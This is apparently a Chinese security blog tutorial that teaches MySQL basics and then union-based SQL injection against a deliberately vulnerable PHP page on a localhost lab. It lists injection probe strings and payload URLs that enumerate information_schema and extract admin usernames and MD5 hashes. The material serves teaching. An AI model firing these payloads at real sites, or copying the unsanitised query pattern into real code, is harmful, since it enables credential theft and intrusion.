    <content type="text"><![CDATA[MySql基础语法mysql无非就是增删改查 mysql数据库结构： 数据库 test,test1 表名 admin,manage 数据 id,username,password 现在，为了我们接下来的实验，我们需要切换数据库到test，mysql自带一个test数据库，没有装mysql的自行百度切换方式：12mysql&gt; use test;Database changed //有这条提示就切换成功了 create 创建表 首先我们先来创建一个表名为：admin，里面包含了id，username，password，email：123456mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32), -&gt; email varchar(30));Query OK, 0 rows affected (0.01 sec) --有了这个提示就是创建成功了 现在我们已经成功创建了一个,可以用desc来查看表结构：12345678910mysql&gt; desc admin;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(15) | NO | | NULL | || password | char(32) | YES | | NULL | || email | varchar(30) | YES | | NULL | |+----------+-------------+------+-----+---------+----------------+4 rows in set (0.04 sec) insert 插入数据 接着上面的表，我们想表里面插入一条数据12mysql&gt; insert into admin(username,password,email) values('smelond','qweqwe','2698115328@qq.com'); --为什么没有指定id列，因为我们在创建表时给id指定了自动增值(auto_increment)Query OK, 1 row affected (0.00 sec) select 查询语句 上面我们已经向数据库里面插入了一条数据了，现在我们可以查询一下是否插入成功1234567mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com |+----+----------+----------+-------------------+1 row in set (0.00 sec) --已经看到了，数据已经插入进去，并且id号为1，如果我们下次插入id号会自动增长 update 修改表中的数据 现在我们为admin数据表在次插入一条数据12mysql&gt; insert into admin(username,password,email) values('admin','qweqwe','xxx@163.com');Query OK, 1 row affected (0.00 sec) 插入完成以后用updata修改admin的密码为asdasd,(从原来的qweqwe修改为asdasd)123mysql&gt; update admin set password='asdasd' where username='admin'; --修改passwrod为asdasd，条件是username=adminQuery OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0 接着我们查询一下是否修改成功12345678mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com || 2 | admin | asdasd | xxx@163.com |+----+----------+----------+-------------------+2 rows in set (0.00 sec) delete 删除表中的数据 上面我们已经向表中插入了两条数据了现在我们试着将表中的数据删除12345mysql&gt; delete from admin where username='admin';Query OK, 1 row affected (0.00 sec)mysql&gt; delete from admin where id=1;Query OK, 1 row affected (0.00 sec) 可以看到我上面已经删除了两条数据，现在查询admin数据库里面应该什么都没有12mysql&gt; select * from admin;Empty set (0.00 sec) 常见的方式手工判断网站是否可以注入12345671=1 and 1=2admin' --admin' #admin'/*' or 1=1--' or 1=1/*' or 1=1# SQL注入的准备什么是SQL注入攻击？ SQL攻击（英语：SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。（引用wiki） sql注入实验环境： phpstudy集成环境 IDE:sublime text3 没有的自行百度！！！ 编写一个有漏洞的PHP代码首先我们需要启动mysql，创建一个数据库命名为sqlin,并且切换过去 use sqlin12create database sqlin default character set utf8 collate utf8_general_ci;use sqlin; 创建admin表和page表：12345678mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255)); 向admin、page表里面分别插入数据1234mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 上面的efe6398127928f1b2e9ef3207fb82663是32位的md5值，没加密之前是qweqwe 然后我们查询一下是数据是否插入成功：12345678910111213141516mysql&gt; select * from admin;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | smelond | efe6398127928f1b2e9ef3207fb82663 || 2 | admin | efe6398127928f1b2e9ef3207fb82663 |+----+----------+----------------------------------+2 rows in set (0.00 sec)mysql&gt; select * from page;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com || 2 | test | smelond.com |+----+----------+---------------------+2 rows in set (0.00 sec) 解释一下，为什么我们创建了一个数据库会又在数据库里面创建了两个表？为什么不是一个表？原因是因为： 在真实的网站案例中，没有管理员会把所有的数据都放在一个表中，而是多个表、多个数据库(方便管理)。 放在一个表中查询很麻烦，比如文章，用户名，一些个人信息等。 还有很多很多原因。。。 编写php代码没学过php，代码写的不行，路过的大神可以帮忙看看1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//连接数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id=$id";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面的代码中，我们连接数据库是slqin，查询的数据表时page，并没有用到admin那个表，因为网页显示的是文章或一些其他的内容。 开始我们的表演我刚刚已经将我写的代码放到了phpstudy的WWW目录下了我的路径是：D:\phpStudy\PHPTutorial\WWW\webpentest\mysql\index.php现在开始访问网站1http://127.0.0.1/webpentest/mysql/index.php 访问进入之后可能就是一些报错信息，不管这些，因为页面上的内容是从数据库里面调用的，然后在index.php后面加上?x=11http://127.0.0.1/webpentest/mysql/index?x=1 //?x=1意思是从数据库里面找id=1的内容 现在看看，网页上面是否有了正常数据库了呢 简单的判断是否存在注入判断网站是否存在注入，可以先试着在?x=1后面加上and 1=1、and 1=2 加上and 1=1会返回正常页面，如果出现安全狗之类的（实战中）错误，以后再说 加上and 1=2返回页面错误，就可能有注入了，因为页面上的内容是到数据库里面查询返回结果的 加上and 1=2时，看下面语句：12345678910mysql&gt; select * from page where id=1 and 1=1;+----+----------+---------------------+| id | title | content |+----+----------+---------------------+| 1 | sqlzhuru | https://smelond.com |+----+----------+---------------------+1 row in set (0.00 sec) //正常返回mysql&gt; select * from page where id=1 and 1=2;Empty set (0.00 sec) //看吧，没有返回,所以网页上面没有内容 在页面后面加上 and 1=2,没有正常返回结果，那当然就是有注入了看到当前执行的语句为：select * from page where id=1 and 1=2 查询数据库信息 order by number //判断字段 union select 1,2,3… //将两个表合并一起查询 database() //数据库名 user() //数据库用户 version() //数据库版本 @@version_compile_os //操作系统 拿上刚刚写的页面测试order by http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 5 //返回错误 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 2 //返回正常 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 3 //返回正常 http://127.0.0.1/webpentest/mysql/index.php?x=1 order by 4 //返回错误好了，现在已经判断出一共有3个字段了 接着 union http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3又有了同学问道，为啥前面要加上and 1=2 ？原因是因为：先让网页报错，然后进行union后面的查询，这样后面查询的内容才会显示在网页上。网页已经显示出了我们查询的1,2,3 再来查询数据库名，数据库用户，数据库版本 http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version()现在已经获取到了数据库名，数据库用户，数据库版本了 一个小小的提示： mysql5.0以上的数据库自带：information_schema information_schema数据库存储了mysql下所有的数据库、表名、列名请你一定记住这个，而且现在基本都是mysql5.0以上的数据库了 information_schema表该怎么用？现在我们已经获取到了数据库名：sqlin；数据库用户：root；数据库版本：5.5.53在数据库查询语句中”.”表示下一级的意思 information_schema.schemata information_schema数据库里面的schemata表，他里面存储了所有数据库名称。 information_schema.tables information_schema数据库里面的tables表，他里面存储了所有数据库下的表名信息。 information_schema.columns： information_schema数据库里面的columns表，他里面存储了所有数据库下的列名信息。 table_schema 数据表所属的数据库名 table_name 表名称 column_name 列名称 schema_name 数据库名 获取数据库下的表名信息然后我们现在来试着获取sqlin数据库下的所有表名信息：12345http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1// limit 0,1表示从0开始，取1个，然后我们拿到了数据库sqlin下的数据表adminhttp://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1// limit 1,1表示从1开始，取1个，然后我们又拿到数据库sqlin下的数据库page 同时取多个：首先我们试试：12http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,table_name,3 from information_schema.tables where table_schema='sqlin' limit 0,2// 返回内容发现两个都是admin，显然，这种limit 0,2的方法是不行的，因为并没有显示page表 再试试：1234http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),3 from information_schema.tables where table_schema='sqlin' limit 0,2// 从0开始，取两个，第二个会显示出来admin，为了让他显示page，所以我果断的将table_name改为了// (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)// 在这个里面，查询出来的很明显就应该是page，所以同时就取出来了两个 我们在数据库里面简单的测试一下1234567891011121314151617181920212223mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| admin | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,2,3 from information_schema.tables where table_schema='sqlin' limit 1,1;+------------+---+---+| table_name | 2 | 3 |+------------+---+---+| page | 2 | 3 |+------------+---+---+1 row in set (0.00 sec)mysql&gt; select table_name,(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),2 from information_schema.tables where table_schema='sqlin' limit 0,1;+------------+-----------------------------------------------------------------------------------------+---+| table_name | (select table_name from information_schema.tables where table_schema='sqlin' limit 1,1) | 2 |+------------+-----------------------------------------------------------------------------------------+---+| admin | page | 2 |+------------+-----------------------------------------------------------------------------------------+---+1 row in set (0.00 sec) 现在我们已经获取到一下内容： 网站数据库名: sqlin 数据库版本: 5.5.53 数据库用户: root 当前网站数据库下的表名: 分别为admin,page 获取数据库下的表名下的列名信息上面我们已经获取到了sqlin数据库，并且获取到了sqlin数据库下面的admin表，以及page表从表的名称可以看出，admin表肯定是存储用户登录账户和密码的 继续获取admin表里面的列名信息：123456http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 0,1// 获取到了id列名http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 1,1// 获取到了user列名http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select column_name,2,3 from information_schema.columns where table_name='admin' limit 2,1// 获取到了password列名 需要的东西都已经获取到了：网站数据库：sqlin数据库下的表：admin，pageadmin表下的列名：id,username,password 还差最后一步，获取username,password里面的内容这就简单了，没有之前那么繁琐只需要查询即可：123http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select username,password,3 from adminsmelondefe6398127928f1b2e9ef3207fb82663 偶然发现了一个很好玩的函数concat()concat函数用于连接两个或多个字符串，形成一个字符串。好了，现在有同学问，这个函数在sql注入中有什么作用？cmd里面打开我们的mysql 测试一下就知道了：12345678910111213141516171819202122mysql&gt; select concat(123,':::','qwe');+-------------------------+| concat(123,':::','qwe') |+-------------------------+| 123:::qwe |+-------------------------+1 row in set (0.00 sec)mysql&gt; select concat(123,'qwe');+-------------------+| concat(123,'qwe') |+-------------------+| 123qwe |+-------------------+1 row in set (0.00 sec)mysql&gt; select concat('用户名：','smelond','密码：','qweqwe');+------------------------------------------------+| concat('用户名：','smelond','密码：','qweqwe') |+------------------------------------------------+| 用户名：smelond密码：qweqwe |+------------------------------------------------+1 row in set, 2 warnings (0.00 sec) 现在好像知道有啥用了，哈哈！！！比如我们在进行sql注入时，发现只有一个地方有回显，但是想同时查询username，password，等多个内容，这个时候我们就可以用concat() 好了，我还是拿着代码去试试吧。12345678http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat('&lt;br&gt;账号：',username,'&lt;br&gt;','密码：',password),2,3 from admin输出结果： // 账号：smelond // 密码：efe6398127928f1b2e9ef3207fb82663http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select concat(username,'&gt;&gt;&gt;',password),2,3 from admin输出结果： // smelond&gt;&gt;&gt;efe6398127928f1b2e9ef3207fb82663 当然不止上面这个一点用法咯，还有：1http://127.0.0.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,concat(table_name,':',(select table_name from information_schema.tables where table_schema='sqlin' limit 1,1)),3 from information_schema.tables where table_schema='sqlin' limit 0,1 这回好像没毛病了吧，哈哈，emmmmmmmmm！！！ 最后，记得拿着md5值去解密。。。 efe6398127928f1b2e9ef3207fb82663 == qweqwe]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
</search>
